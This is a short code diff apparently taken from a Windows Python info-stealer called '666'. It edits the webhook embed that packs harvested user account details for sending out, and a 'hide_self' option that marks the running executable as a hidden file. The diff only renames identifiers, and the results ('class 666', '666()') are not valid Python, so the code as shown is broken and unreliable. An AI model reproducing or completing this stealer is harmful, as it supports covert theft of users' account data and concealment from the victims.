@@ -72,10 +72,10 @@ class 666(functions):
             if "username" in user:
                 if config.get('webhook'):
                     webhook_data = {
-                        "username": "⁶⁶⁶ ",
+                        "username": "666",
                         "embeds": [
                             {
-                                "title": '⁶⁶⁶ Info ',
+                                "title": '666 Info',
                                 "color": color,
                                 'fields': [
                                     {
@@ -187,4 +187,4 @@ class 666(functions):
 if __name__ == "__main__" and os.name == 'nt':
     if config.get('hide_self'):
         ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
-    ⁶⁶⁶()
+    666()
